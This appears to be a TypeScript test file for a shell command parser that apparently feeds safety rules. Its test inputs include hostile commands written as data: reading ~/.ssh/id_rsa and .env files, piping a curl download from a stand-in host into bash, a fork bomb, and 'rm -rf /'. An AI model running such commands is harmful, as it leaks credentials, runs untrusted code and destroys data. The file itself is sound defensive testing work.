import { test } from 'node:test';
import assert from 'node:assert/strict';
import { parseCommand, commandName, hasFlag, positionals } from './command.js';

const argvs = (cmd: string) => parseCommand(cmd).segments.map((s) => s.argv);

test('splits on operators and strips quotes', () => {
  assert.deepEqual(argvs(`echo "a b" && ls -la; cat 'x y' | wc -l`), [
    ['echo', 'a b'],
    ['ls', '-la'],
    ['cat', 'x y'],
    ['wc', '-l'],
  ]);
});

test('detects background and redirects', () => {
  const p = parseCommand('node server.js > out.log 2>&1 &');
  assert.equal(p.segments.length, 1);
  assert.equal(p.segments[0].background, true);
  assert.deepEqual(p.segments[0].redirects, [
    { op: '>', target: 'out.log' },
    { op: '2>&', target: '&1' },
  ]);
  assert.equal(parseCommand('a && b').segments.some((s) => s.background), false);
});

test('unwraps sudo, env, nohup and bash -c', () => {
  const p = parseCommand(`sudo -u root env FOO=1 nohup bash -c "rm -rf /tmp/x; echo done"`);
  assert.deepEqual(
    p.segments.map((s) => s.argv),
    [
      ['rm', '-rf', '/tmp/x'],
      ['echo', 'done'],
    ],
  );
  assert.equal(p.segments[0].privileged, true);
  assert.equal(p.segments[0].detached, true);
  assert.ok(p.segments[0].wrappers.includes('sudo'));
});

test('parses command substitutions', () => {
  const p = parseCommand('echo $(cat ~/.ssh/id_rsa) `whoami`');
  const heads = p.segments.map((s) => s.argv[0]);
  assert.deepEqual(heads, ['echo', 'cat', 'whoami']);
  assert.equal(p.substitutions.length, 2);
});

test('handles xargs and eval', () => {
  assert.deepEqual(argvs('find . -name "*.log" | xargs -0 rm -f'), [
    ['find', '.', '-name', '*.log'],
    ['rm', '-f'],
  ]);
  assert.deepEqual(argvs(`eval "git push origin main"`), [['git', 'push', 'origin', 'main']]);
});

test('drops shell keywords and assignments', () => {
  const p = parseCommand('if grep -q x f; then FOO=bar make test; fi');
  assert.deepEqual(p.segments.map((s) => s.argv), [
    ['grep', '-q', 'x', 'f'],
    ['make', 'test'],
  ]);
  assert.deepEqual(p.segments[1].assignments, ['FOO=bar']);
});

test('flags incomplete parses', () => {
  assert.equal(parseCommand('bash <(curl -s https://x.test/install.sh)').complete, false);
  assert.equal(parseCommand(`echo "unterminated`).complete, false);
  assert.equal(parseCommand(':(){ :|:& };:').complete, false);
});

test('here documents are skipped', () => {
  const p = parseCommand("cat > file.txt <<'EOF'\nrm -rf /\nEOF\necho ok");
  assert.deepEqual(p.segments.map((s) => s.argv[0]), ['cat', 'echo']);
  assert.equal(p.segments[0].hereDoc, true);
});

test('PowerShell and cmd paths keep their backslashes', () => {
  // A POSIX shell escapes with a backslash, so C:\\Users\\me would collapse to C:Usersme and the
  // path rules would never see a path at all.
  const win = parseCommand(String.raw`Get-Content C:\Users\me\.ssh\id_rsa`, 0, { escapeBackslash: false });
  assert.deepEqual(win.segments[0].argv, ['Get-Content', String.raw`C:\Users\me\.ssh\id_rsa`]);
  const quoted = parseCommand(String.raw`type "D:\proj\.env"`, 0, { escapeBackslash: false });
  assert.deepEqual(quoted.segments[0].argv, ['type', String.raw`D:\proj\.env`]);
  // POSIX escaping is untouched by default.
  assert.deepEqual(parseCommand(String.raw`echo a\ b`).segments[0].argv, ['echo', 'a b']);
  assert.deepEqual(parseCommand(String.raw`Get-Content C:\Users\me`).segments[0].argv, ['Get-Content', 'C:Usersme']);
});

test('helpers', () => {
  assert.equal(commandName('/usr/bin/RM.EXE'), 'rm');
  assert.equal(hasFlag(['rm', '-fr', 'x'], ['r']), true);
  assert.equal(hasFlag(['rm', '--recursive', 'x'], [], ['--recursive']), true);
  assert.deepEqual(positionals(['rm', '-rf', '--', '-weird', 'x']), ['-weird', 'x']);
});
